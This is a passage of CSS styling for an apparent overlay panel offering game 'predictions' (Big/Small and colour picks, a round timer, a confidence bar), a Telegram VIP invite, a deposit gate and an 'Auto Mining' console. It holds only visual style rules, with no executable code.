    color: rgba(255, 255, 255, 0.9);
  }
  .pw-tld {
    font-weight: 500;
    opacity: 0.55;
    font-size: 11px;
  }
  .close-btn {
    width: 24px;
    height: 24px;
    border-radius: 7px;
    border: none;
    background: var(--x-bg);
    color: var(--x-col);
    font-size: 11px;
    cursor: pointer;
    line-height: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: var(--f);
    transition: all 0.15s;
  }
  .close-btn:hover {
    background: var(--x-bg-h);
    color: var(--x-col-h);
  }
  .panel-body {
    padding: 14px 12px 13px;
    color: var(--t-body);
    font-size: 12px;
    line-height: 1.5;
    animation: fadeUp 0.24s var(--ease) 0.04s both;
  }
  @keyframes fadeUp {
    from {
      opacity: 0;
      transform: translateY(8px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  .view {
    display: none;
  }
  .view.active {
    display: block;
    animation: viewIn 0.2s var(--ease);
  }
  @keyframes viewIn {
    from {
      opacity: 0;
      transform: translateX(8px);
    }
    to {
      opacity: 1;
      transform: translateX(0);
    }
  }
  .view.active {
    display: block;
    animation: viewIn 0.2s var(--ease);
  }
  .view-menu.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  @keyframes viewIn {
    from {
      opacity: 0;
      transform: translateX(8px);
    }
    to {
      opacity: 1;
      transform: translateX(0);
    }
  } /* ── Main Menu ── */
  .menu-shell {
    display: flex;
    flex-direction: column;
  }
  .menu-home-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .menu-home-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--pro) 28%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .menu-home-opt {
    display: flex;
    align-items: center;
    gap: 10px;
    width: 100%;
    padding: 11px 12px;
    border: none;
    background: transparent;
    cursor: pointer;
    text-align: left;
    font-family: var(--f);
    transition:
      background 0.16s var(--ease),
      transform 0.16s var(--ease);
  }
  .menu-home-opt + .menu-home-opt {
    border-top: 1px solid var(--strip);
  }
  .menu-home-opt:hover {
    background: var(--strip);
  }
  .menu-home-opt:active {
    transform: scale(0.99);
    transition-duration: 0.06s;
  }
  .menu-home-icon {
    width: 36px;
    height: 36px;
    border-radius: 10px;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: transform 0.18s var(--ease);
  }
  .menu-home-icon svg {
    width: 18px;
    height: 18px;
    fill: currentColor;
  }
  .menu-home-pro .menu-home-icon {
    background: var(--pro-lt);
    color: var(--pro);
  }
  .menu-home-vip .menu-home-icon {
    background: var(--vip-lt);
    color: var(--vip);
  }
  .menu-home-mine .menu-home-icon {
    background: var(--mine-lt);
    color: var(--mine);
  }
  .menu-home-opt:hover .menu-home-icon {
    transform: scale(1.05);
  }
  .menu-home-body {
    flex: 1;
    min-width: 0;
  }
  .menu-home-top {
    display: flex;
    align-items: center;
    gap: 6px;
    margin-bottom: 1px;
  }
  .menu-home-name {
    font-size: 13px;
    font-weight: 700;
    letter-spacing: -0.15px;
    color: var(--t-title);
  }
  .menu-home-desc {
    display: block;
    font-size: 10px;
    font-weight: 500;
    color: var(--t-body);
    letter-spacing: 0.02px;
  }
  .menu-home-arrow {
    width: 12px;
    height: 12px;
    flex-shrink: 0;
    stroke: var(--t-dim);
    stroke-width: 2.5;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    opacity: 0;
    transform: translateX(-4px);
    transition:
      opacity 0.16s var(--ease),
      transform 0.16s var(--ease),
      stroke 0.16s var(--ease);
  }
  .menu-home-pro:hover .menu-home-arrow {
    opacity: 0.75;
    transform: translateX(0);
    stroke: var(--pro);
  }
  .menu-home-vip:hover .menu-home-arrow {
    opacity: 0.75;
    transform: translateX(0);
    stroke: var(--vip);
  }
  .menu-home-mine:hover .menu-home-arrow {
    opacity: 0.75;
    transform: translateX(0);
    stroke: var(--mine);
  }
  .menu-home-foot {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    padding-top: 9px;
    margin-top: 8px;
    border-top: 1px solid var(--strip);
    font-size: 9.5px;
    color: var(--t-dim);
    font-weight: 500;
  }
  .menu-home-live {
    display: flex;
    align-items: center;
    gap: 4px;
  }
  .menu-home-live .status-dot {
    width: 4px;
    height: 4px;
  }
  .menu-home-foot-sep {
    opacity: 0.2;
    font-size: 9px;
    font-weight: 300;
  }
  .menu-home-tg {
    display: inline-flex;
    align-items: center;
    gap: 3px;
    border: none;
    background: transparent;
    padding: 0;
    font-family: var(--f);
    font-size: 9.5px;
    font-weight: 500;
    color: #2aabee;
    cursor: pointer;
    transition:
      opacity 0.15s,
      transform 0.15s;
  }
  .menu-home-tg:hover {
    opacity: 0.85;
  }
  .menu-home-tg:active {
    transform: scale(0.98);
  }
  .menu-home-tg svg {
    flex-shrink: 0;
    width: 10px;
    height: 10px;
  }
  .card-badge {
    font-size: 8px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    padding: 2px 7px;
    border-radius: 50px;
    border: 1px solid transparent;
  }
  .badge-pro {
    background: var(--pro-lt);
    color: var(--pro-txt);
    border-color: var(--pro-bdr-h);
  }
  .badge-vip {
    background: var(--vip-lt);
    color: var(--vip-txt);
    border-color: var(--vip-bdr-h);
  }
  .badge-mine {
    background: var(--mine-lt);
    color: var(--mine-txt);
    border-color: var(--mine-bdr-h);
  }
  .badge-upi {
    background: var(--upi-lt);
    color: var(--upi-txt);
    border-color: var(--upi-bdr-h);
  }
  .badge-crypto {
    background: var(--crypto-lt);
    color: var(--crypto-txt);
    border-color: var(--crypto-bdr-h);
  }
  .status-row {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    padding: 9px 0 0;
    margin-top: 9px;
    border-top: 1px solid var(--strip);
    font-size: 10px;
    color: var(--t-dim);
    font-weight: 500;
    letter-spacing: 0.2px;
  }
  .status-live {
    display: flex;
    align-items: center;
    gap: 5px;
  }
  .status-dot {
    width: 5px;
    height: 5px;
    border-radius: 50%;
    background: var(--live);
    flex-shrink: 0;
    animation: livePulse 2.4s ease-in-out infinite;
  }
  .status-sep {
    color: var(--t-dim);
    opacity: 0.35;
  }
  .status-tg-btn {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    border: none;
    background: transparent;
    padding: 2px 6px;
    font-family: var(--f);
    font-size: 10px;
    font-weight: 600;
    color: #2aabee;
    cursor: pointer;
    transition:
      opacity 0.15s,
      transform 0.15s;
    border-radius: 6px;
  }
  .status-tg-btn:hover {
    opacity: 0.85;
  }
  .status-tg-btn:active {
    transform: scale(0.96);
  }
  .status-tg-btn svg {
    flex-shrink: 0;
  }
  @keyframes livePulse {
    0%,
    100% {
      opacity: 1;
      box-shadow: 0 0 0 0 rgba(52, 211, 153, 0.5);
    }
    50% {
      opacity: 0.6;
      box-shadow: 0 0 0 4px rgba(52, 211, 153, 0);
    }
  }
  .back-btn {
    width: 32px;
    height: 32px;
    border-radius: 10px;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 1px solid var(--back-bdr);
    background: var(--back-bg);
    color: var(--back-col);
    cursor: pointer;
    padding: 0;
    font-family: var(--f);
    transition: all 0.18s;
  }
  .back-btn svg {
    width: 14px;
    height: 14px;
    stroke: currentColor;
    fill: none;
    stroke-width: 2.5;
    stroke-linecap: round;
    stroke-linejoin: round;
  }
  .back-btn:hover {
    color: var(--back-col-h);
    border-color: var(--back-bdr-h);
    background: var(--pro-lt);
  }
  .pro-top {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 10px;
  }
  .pro-gameinfo {
    flex: 1;
    min-width: 0;
    display: flex;
    flex-direction: column;
    gap: 2px;
  }
  .pro-gameinfo-row {
    display: flex;
    align-items: center;
    gap: 7px;
  }
  .pro-game-name {
    font-size: 13.5px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.25px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  :host(.light) .pro-game-name {
    color: #1f1f2e;
  }
  .pro-live-badge {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    background: rgba(52, 211, 153, 0.1);
    border: 1px solid rgba(52, 211, 153, 0.22);
    border-radius: 50px;
    padding: 2px 8px;
    font-size: 8px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    color: #34d399;
    flex-shrink: 0;
    white-space: nowrap;
  }
  :host(.light) .pro-live-badge {
    background: rgba(22, 163, 74, 0.07);
    border-color: rgba(22, 163, 74, 0.2);
    color: #16a34a;
  }
  .pro-round {
    font-size: 10px;
    font-weight: 600;
    color: var(--t-dim);
    letter-spacing: 0.4px;
    font-variant-numeric: tabular-nums;
    font-family: var(--f);
  }
  :host(.light) .pro-round {
    color: #9ca3af;
  }
  .live-pip {
    width: 5px;
    height: 5px;
    border-radius: 50%;
    flex-shrink: 0;
    background: currentColor;
    animation: livePulse 2s ease-in-out infinite;
  }
  .pro-timer-wrap {
    position: relative;
    text-align: center;
    margin: 0 0 10px;
    padding: 9px 12px 11px;
    background: var(--tw-bg);
    border: 1px solid var(--tw-bdr);
    border-radius: 16px;
    overflow: hidden;
  }
  .pro-timer-wrap::after {
    content: "";
    position: absolute;
    bottom: 0;
    left: 0;
    height: 3px;
    border-radius: 0 3px 3px 0;
    width: var(--pct, 100%);
    background: linear-gradient(90deg, var(--live), #a7f3d0);
    transition:
      width 1s linear,
      background 0.6s;
  }
  .pro-timer-wrap.tw-warn::after {
    background: linear-gradient(90deg, #f59e0b, #fde68a);
  }
  .pro-timer-wrap.tw-end::after {
    background: linear-gradient(90deg, #ef4444, #fca5a5);
  }
  .pro-timer-label {
    font-size: 9px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--t-dim);
    margin-bottom: 2px;
  }
  .pro-timer {
    font-size: 30px;
    font-weight: 900;
    letter-spacing: 2px;
    font-variant-numeric: tabular-nums;
    line-height: 1;
    color: var(--t-title);
    font-family: var(--f);
    transition: color 0.4s;
  }
  .pro-timer.t-warn {
    color: #f59e0b;
  }
  .pro-timer.t-end {
    color: #ef4444;
    animation: timerShake 0.45s var(--ease) infinite;
  }
  @keyframes timerShake {
    0%,
    100% {
      transform: scale(1);
    }
    50% {
      transform: scale(1.07);
    }
  }
  .pro-card {
    background: var(--pc-bg);
    border: 1px solid var(--pc-bdr);
    border-radius: 16px;
    padding: 20px 14px 16px;
    box-shadow: var(--pc-shad);
    min-height: 138px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow: hidden;
    transition:
      border-color 0.5s,
      box-shadow 0.5s;
  }
  .pro-card::before {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
      105deg,
      transparent 35%,
      rgba(139, 92, 246, 0.05) 50%,
      transparent 65%
    );
    opacity: 0;
    transition: opacity 0.3s;
  }
  .pro-card.shimmer::before {
    opacity: 1;
    animation: sweep 1.7s ease-in-out infinite;
  }
  @keyframes sweep {
    0% {
      transform: translateX(-100%);
    }
    100% {
      transform: translateX(100%);
    }
  }
  .pro-card.c-big {
    border-color: rgba(254, 170, 87, 0.24);
    box-shadow:
      0 10px 36px rgba(254, 170, 87, 0.12),
      0 0 0 1px rgba(254, 170, 87, 0.1);
  }
  .pro-card.c-small {
    border-color: rgba(110, 168, 244, 0.24);
    box-shadow:
      0 10px 36px rgba(110, 168, 244, 0.12),
      0 0 0 1px rgba(110, 168, 244, 0.1);
  }
  :host(.light) .pro-card.c-big {
    border-color: rgba(254, 170, 87, 0.3);
    box-shadow:
      0 6px 24px rgba(254, 170, 87, 0.15),
      0 0 0 1px rgba(254, 170, 87, 0.12);
  }
  :host(.light) .pro-card.c-small {
    border-color: rgba(110, 168, 244, 0.3);
    box-shadow:
      0 6px 24px rgba(110, 168, 244, 0.15),
      0 0 0 1px rgba(110, 168, 244, 0.12);
  }
  .pro-scanning {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 14px;
    min-height: 100px;
    width: 100%;
  }
  .scan-rings {
    position: relative;
    width: 52px;
    height: 52px;
  }
  .scan-ring-o {
    position: absolute;
    inset: 0;
    border-radius: 50%;
    border: 2px solid transparent;
    border-top-color: var(--pro);
    animation: spin 1.3s linear infinite;
  }
  .scan-ring-i {
    position: absolute;
    inset: 11px;
    border-radius: 50%;
    border: 2px solid transparent;
    border-top-color: var(--pro-txt);
    opacity: 0.5;
    animation: spin 0.75s linear infinite reverse;
  }
  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }
  .scan-label {
    font-size: 11px;
    font-weight: 600;
    color: var(--t-body);
    letter-spacing: 0.2px;
    font-family: var(--f);
    display: flex;
    align-items: center;
    gap: 3px;
  }
  .s-dot {
    width: 3px;
    height: 3px;
    border-radius: 50%;
    background: currentColor;
    opacity: 0.3;
    animation: blink 1.2s ease-in-out infinite;
  }
  .s-dot:nth-child(2) {
    animation-delay: 0.2s;
  }
  .s-dot:nth-child(3) {
    animation-delay: 0.4s;
  }
  @keyframes blink {
    0%,
    80%,
    100% {
      opacity: 0.2;
    }
    40% {
      opacity: 0.9;
    }
  }
  .pro-prediction {
    width: 100%;
    text-align: center;
    animation: reveal 0.45s cubic-bezier(0.2, 0.8, 0.2, 1);
  }
  @keyframes reveal {
    from {
      opacity: 0;
      transform: scale(0.84);
      filter: blur(6px);
    }
    to {
      opacity: 1;
      transform: scale(1);
      filter: blur(0);
    }
  }
  .streak-badge {
    display: none;
    align-items: center;
    justify-content: center;
    gap: 4px;
    padding: 3px 10px;
    border-radius: 50px;
    margin: 0 auto 10px;
    background: var(--pro-lt);
    color: var(--pro-txt);
    border: 1px solid rgba(139, 92, 246, 0.2);
    font-size: 9px;
    font-weight: 800;
    letter-spacing: 0.3px;
    text-transform: uppercase;
    width: fit-content;
  }
  :host(.light) .streak-badge {
    background: rgba(224, 60, 60, 0.07);
    color: #b91c1c;
    border-color: rgba(224, 60, 60, 0.16);
  }
  .pred-hero {
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 12px;
    height: 68px;
  }
  .pred-glow {
    position: absolute;
    width: 82px;
    height: 82px;
    border-radius: 50%;
    filter: blur(24px);
    opacity: 0;
    transition:
      opacity 0.5s,
      background 0.5s;
    pointer-events: none;
  }
  .pred-glow.big {
    background: var(--big);
    opacity: 0.22;
  }
  .pred-glow.small {
    background: var(--small);
    opacity: 0.22;
  }
  :host(.light) .pred-glow.big {
    opacity: 0.16;
  }
  :host(.light) .pred-glow.small {
    opacity: 0.16;
  }
  .pred-ball {
    width: 60px;
    height: 60px;
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;
    filter: drop-shadow(0 6px 14px rgba(0, 0, 0, 0.25));
    position: relative;
    z-index: 1;
    animation: float 3s ease-in-out infinite;
  }
  @keyframes float {
    0%,
    100% {
      transform: translateY(0);
    }
    50% {
      transform: translateY(-4px);
    }
  }
  .pred-tags {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-bottom: 12px;
  }
  .pred-size {
    padding: 7px 26px;
    border-radius: 50px;
    font-size: 15px;
    font-weight: 900;
    color: #fff;
    letter-spacing: -0.1px;
    position: relative;
    overflow: hidden;
    transition: all 0.35s;
  }
  .pred-size::after {
    content: "";
    position: absolute;
    top: -60%;
    left: -40%;
    width: 180%;
    height: 160%;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0.18),
      transparent 55%
    );
    pointer-events: none;
  }
  .pred-size.big {
    background: linear-gradient(135deg, #feaa57, #f97316);
    box-shadow: 0 4px 18px rgba(254, 170, 87, 0.45);
  }
  .pred-size.small {
    background: linear-gradient(135deg, #6ea8f4, #3b82f6);
    box-shadow: 0 4px 18px rgba(110, 168, 244, 0.45);
  }
  .pred-color {
    padding: 5px 14px;
    border-radius: 50px;
    font-size: 10px;
    font-weight: 800;
    color: #fff;
    letter-spacing: 0.4px;
    text-transform: uppercase;
  }
  .pred-color.red {
    background: linear-gradient(135deg, #fb5b5b, #dc2626);
  }
  .pred-color.green {
    background: linear-gradient(135deg, #18b660, #16a34a);
  }
  .pred-color.violet {
    background: linear-gradient(135deg, #c86eff, #9333ea);
  }
  .pred-conf {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .conf-track {
    flex: 1;
    height: 5px;
    background: var(--strip);
    border-radius: 3px;
    overflow: hidden;
  }
  .conf-fill {
    height: 100%;
    border-radius: 3px;
    background: linear-gradient(90deg, var(--big), #fb5b5b);
    transition: width 0.7s var(--ease);
    width: 0;
    position: relative;
  }
  .conf-fill.small {
    background: linear-gradient(90deg, var(--small), #6ea8f4);
  }
  .conf-fill::after {
    content: "";
    position: absolute;
    right: -1px;
    top: -2px;
    bottom: -2px;
    width: 7px;
    background: inherit;
    border-radius: 50%;
    filter: blur(3px);
    opacity: 0.65;
  }
  .conf-pct {
    font-size: 12px;
    font-weight: 900;
    color: var(--t-title);
    font-variant-numeric: tabular-nums;
    min-width: 35px;
    text-align: right;
  }
  :host(.light) .conf-pct {
    color: #1f1f2e;
  }
  .pred-history {
    display: none;
    align-items: center;
    justify-content: center;
    gap: 4px;
    margin-top: 10px;
    padding-top: 10px;
    border-top: 1px solid var(--strip);
  }
  .hist-label {
    font-size: 9px;
    font-weight: 700;
    color: var(--t-dim);
    letter-spacing: 0.2px;
    margin-right: 2px;
  }
  .hist-dot {
    width: 10px;
    height: 10px;
    border-radius: 50%;
    flex-shrink: 0;
    transition: transform 0.2s;
    cursor: default;
  }
  .hist-dot.big {
    background: var(--big);
    box-shadow: 0 0 5px rgba(254, 170, 87, 0.4);
  }
  .hist-dot.small {
    background: var(--small);
    box-shadow: 0 0 5px rgba(110, 168, 244, 0.4);
  }
  .hist-dot:hover {
    transform: scale(1.4);
  }
  .vip-header {
    display: flex;
    align-items: center;
    gap: 9px;
    margin-bottom: 12px;
  }
  .vip-header-label {
    flex: 1;
    font-size: 13.5px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.2px;
  }
  .vip-invite-pill {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    background: var(--vip-lt);
    border: 1px solid var(--vip-bdr-h);
    border-radius: 50px;
    padding: 2px 8px;
    font-size: 8px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    color: var(--vip);
    white-space: nowrap;
  }
  .vip-hero-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 18px;
    padding: 22px 16px 20px;
    text-align: center;
    margin-bottom: 10px;
    position: relative;
    overflow: hidden;
  }
  .vip-hero-card::before {
    content: "";
    position: absolute;
    top: -50px;
    left: 50%;
    transform: translateX(-50%);
    width: 140px;
    height: 140px;
    background: radial-gradient(
      circle,
      rgba(42, 171, 238, 0.13) 0%,
      transparent 70%
    );
    pointer-events: none;
  }
  .vip-tg-ring {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: linear-gradient(135deg, #2aabee, #229ed9);
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 13px;
    box-shadow:
      0 0 0 8px rgba(42, 171, 238, 0.1),
      0 0 0 16px rgba(42, 171, 238, 0.05),
      0 6px 24px rgba(42, 171, 238, 0.38);
    animation: tgPulse 2.8s ease-in-out infinite;
  }
  @keyframes tgPulse {
    0%,
    100% {
      box-shadow:
        0 0 0 8px rgba(42, 171, 238, 0.1),
        0 0 0 16px rgba(42, 171, 238, 0.05),
        0 6px 24px rgba(42, 171, 238, 0.38);
    }
    50% {
      box-shadow:
        0 0 0 11px rgba(42, 171, 238, 0.14),
        0 0 0 20px rgba(42, 171, 238, 0.06),
        0 8px 30px rgba(42, 171, 238, 0.44);
    }
  }
  .vip-title {
    font-size: 17px;
    font-weight: 900;
    color: var(--gate-title);
    margin: 0 0 7px;
    letter-spacing: -0.5px;
    font-family: var(--f);
    line-height: 1.2;
  }
  .vip-pitch {
    font-size: 11.5px;
    line-height: 1.6;
    color: var(--t-body);
    margin: 0;
    font-family: var(--f);
  }
  .vip-stats {
    display: grid;
    grid-template-columns: 1fr 1fr 1fr;
    margin: 0 0 10px;
    text-align: center;
    background: var(--stat-bg);
    border-radius: 14px;
    border: 1px solid var(--stat-bdr);
    padding: 10px 0;
  }
  .vip-stat {
    display: flex;
    flex-direction: column;
    gap: 1px;
  }
  .vip-stat + .vip-stat {
    border-left: 1px solid var(--stat-bdr);
  }
  .stat-val {
    font-size: 17px;
    font-weight: 900;
    color: var(--gate-title);
    letter-spacing: -0.5px;
    font-family: var(--f);
  }
  .stat-lbl {
    font-size: 9px;
    font-weight: 700;
    color: var(--t-dim);
    text-transform: uppercase;
    letter-spacing: 0.7px;
  }
  .vip-cta {
    width: 100%;
    padding: 12px 16px;
    border-radius: 13px;
    border: none;
    background: linear-gradient(135deg, #2aabee, #1a90cc);
    color: #fff;
    font-size: 13.5px;
    font-weight: 800;
    letter-spacing: 0.02px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 7px;
    font-family: var(--f);
    box-shadow:
      0 5px 20px rgba(42, 171, 238, 0.38),
      0 0 0 1px rgba(42, 171, 238, 0.2);
    transition: all 0.2s var(--ease);
    position: relative;
    overflow: hidden;
  }
  .vip-cta::after {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0.15),
      transparent 55%
    );
    pointer-events: none;
  }
  .vip-cta:hover {
    box-shadow:
      0 8px 28px rgba(42, 171, 238, 0.52),
      0 0 0 1px rgba(42, 171, 238, 0.3);
    transform: translateY(-2px);
  }
  .vip-cta:active {
    transform: scale(0.97);
    transition-duration: 0.08s;
  }
  .vip-arrow {
    flex-shrink: 0;
    transition: transform 0.2s var(--ease);
  }
  .vip-cta:hover .vip-arrow {
    transform: translateX(3px);
  }
  .vip-note {
    text-align: center;
    font-size: 9.5px;
    color: var(--t-dim);
    margin: 8px 0 0;
    font-family: var(--f);
    font-weight: 500;
    letter-spacing: 0.1px;
  }
  .gate-view {
    display: none;
    padding: 22px 16px 24px;
    text-align: center;
    animation: fadeUp 0.25s var(--ease);
  }
  .gate-icon {
    width: 46px;
    height: 46px;
    margin: 0 auto 12px;
    background: var(--pro-lt);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--pro);
    box-shadow: 0 0 0 6px var(--pro-glow);
  }
  .gate-title {
    font-size: 16px;
    font-weight: 900;
    color: var(--gate-title);
    margin: 0 0 6px;
    letter-spacing: -0.4px;
    font-family: var(--f);
  }
  .gate-bal-wrap {
    margin-bottom: 10px;
  }
  .gate-balance {
    display: inline-flex;
    align-items: center;
    background: var(--gate-bal-bg);
    padding: 5px 14px;
    border-radius: 50px;
    font-size: 13px;
    font-weight: 800;
    color: var(--gate-bal-col);
    border: 1px solid var(--gate-bal-bdr);
    font-family: var(--f);
  }
  .gate-desc {
    font-size: 11px;
    line-height: 1.55;
    color: var(--t-body);
    margin: 0 0 16px;
    font-family: var(--f);
  }
  .gate-actions {
    display: flex;
    flex-direction: column;
    gap: 7px;
  }
  .gate-btn {
    padding: 11px 14px;
    border-radius: 12px;
    border: none;
    font-size: 13px;
    font-weight: 700;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: var(--f);
    transition: all 0.2s var(--ease);
    position: relative;
    overflow: hidden;
  }
  .gate-btn:active {
    transform: scale(0.97);
  }
  .gate-btn::after {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0.12),
      transparent 55%
    );
    pointer-events: none;
  }
  .btn-deposit {
    background: linear-gradient(135deg, #22c55e, #16a34a);
    color: #fff;
    box-shadow: 0 4px 16px rgba(34, 197, 94, 0.32);
  }
  .btn-deposit:hover {
    box-shadow: 0 6px 22px rgba(34, 197, 94, 0.44);
    transform: translateY(-1px);
  }
  .btn-telegram {
    background: var(--card-bg);
    color: var(--t-body);
    border: 1px solid var(--card-bdr);
    font-weight: 600;
    font-size: 12px;
  }
  .btn-telegram:hover {
    color: var(--t-title);
    border-color: var(--pro-bdr-h);
  }
  .pro-prediction .pred-hero,
  .pro-prediction .pred-color {
    display: none;
  }
  .pro-prediction.vip-mode .pred-hero {
    display: flex;
  }
  .pro-prediction.vip-mode .pred-color {
    display: inline-block;
  }
  .mine-header {
    display: flex;
    align-items: center;
    gap: 9px;
    margin-bottom: 12px;
  }
  .mine-header-label {
    flex: 1;
    font-size: 13.5px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.2px;
  }
  .mine-energy-pill {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    background: var(--mine-lt);
    border: 1px solid var(--mine-bdr-h);
    border-radius: 50px;
    padding: 2.5px 9px 2.5px 7px;
    font-size: 9px;
    font-weight: 700;
    letter-spacing: 0.5px;
    color: var(--mine);
    white-space: nowrap;
    animation: energyPulse 2.5s ease-in-out infinite;
  }
  :host(.light) .mine-energy-pill {
    color: var(--mine-txt);
  }
  @keyframes energyPulse {
    0%,
    100% {
      box-shadow: 0 0 0 0 transparent;
    }
    50% {
      box-shadow: 0 0 0 4px var(--mine-glow);
    }
  }
  .energy-svg {
    width: 11px;
    height: 11px;
    fill: currentColor;
  } /* ── Auto Mining ── */
  .view-mining {
    position: relative;
  }
  .view-mining.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  .mine-shell {
    display: flex;
    flex-direction: column;
  }
  .mine-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .mine-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--mine) 32%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .mine-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
    padding: 9px 13px;
    min-height: 36px;
    border-bottom: 1px solid var(--strip);
  }
  .mine-lbl {
    font-size: 11.5px;
    font-weight: 600;
    color: var(--t-body);
    letter-spacing: -0.05px;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    flex-shrink: 0;
  }
  .mine-lbl-icon {
    width: 14px;
    height: 14px;
    flex-shrink: 0;
    opacity: 0.6;
  }
  .mine-val {
    font-size: 13px;
    font-weight: 800;
    color: var(--mine);
    font-family: var(--f);
    font-variant-numeric: tabular-nums;
    letter-spacing: -0.2px;
  }
  .mine-input-wrap {
    display: flex;
    align-items: center;
    gap: 3px;
    background: var(--back-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 8px;
    padding: 4px 8px;
    transition:
      border-color 0.15s,
      box-shadow 0.15s;
  }
  .mine-input-wrap:focus-within {
    border-color: var(--mine-bdr-h);
    box-shadow: 0 0 0 3px var(--mine-glow);
  }
  .mine-symbol {
    font-size: 10px;
    font-weight: 600;
    color: var(--t-dim);
  }
  .mine-input {
    width: 68px;
    background: transparent;
    border: none;
    outline: none;
    padding: 0;
    font-size: 12px;
    font-weight: 700;
    color: var(--t-title);
    font-family: var(--f);
    text-align: right;
    -webkit-appearance: none;
    appearance: none;
    font-variant-numeric: tabular-nums;
  }
  .mine-input::-webkit-inner-spin-button,
  .mine-input::-webkit-outer-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }
  .mine-terminal-section {
    padding: 9px 11px;
    border-bottom: 1px solid var(--strip);
  }
  .mining-terminal {
    background: var(--back-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 9px;
    padding: 8px 10px;
    height: 72px;
    overflow-y: auto;
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    font-size: 9px;
    color: var(--t-dim);
    display: flex;
    flex-direction: column;
    gap: 2px;
    scrollbar-width: none;
    scroll-behavior: smooth;
  }
  .mining-terminal::-webkit-scrollbar {
    display: none;
  }
  .mining-terminal .console-line.win {
    color: var(--mine);
  }
  .mining-terminal .console-line.loss {
    color: var(--pro);
  }
  .mining-terminal .console-line.wait {
    color: var(--t-dim);
  }
  .mining-terminal .console-line.active {
    color: var(--mine);
    font-weight: 600;
  }
  .mine-card-foot {
    padding: 10px 13px 11px;
  }
  .mine-cta {
    width: 100%;
    padding: 11px;
    border-radius: 11px;
    border: none;
    background: var(--mine);
    color: #fff;
    font-size: 12.5px;
    font-weight: 700;
    letter-spacing: -0.1px;
    cursor: pointer;
    font-family: var(--f);
    box-shadow: 0 2px 12px color-mix(in srgb, var(--mine) 30%, transparent);
    transition:
      transform 0.15s cubic-bezier(0.16, 1, 0.3, 1),
      box-shadow 0.15s cubic-bezier(0.16, 1, 0.3, 1),
      background 0.15s;
    position: relative;
    overflow: hidden;
  }
  .mine-cta::after {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0.1),
      transparent 52%
    );
    pointer-events: none;
  }
  .mine-cta:hover {
    box-shadow: 0 4px 16px color-mix(in srgb, var(--mine) 40%, transparent);
  }
  .mine-cta:active {
    transform: scale(0.98);
    transition-duration: 0.06s;
  }
  .mine-cta.active {
    background: var(--pro);
    box-shadow: 0 2px 12px color-mix(in srgb, var(--pro) 30%, transparent);
  }
  .mine-cta.active:hover {
    box-shadow: 0 4px 16px color-mix(in srgb, var(--pro) 40%, transparent);
  }
  .mine-note {
    text-align: center;
    font-size: 9.5px;
    color: var(--t-dim);
    margin: 7px 0 0;
    font-weight: 500;
    letter-spacing: 0.02px;
  }
  .mine-hist-btn {
    width: 32px;
    height: 32px;
    border-radius: 10px;
    flex-shrink: 0;
    margin-left: auto;
    display: flex;
    align-items: center;
    justify-content: center;
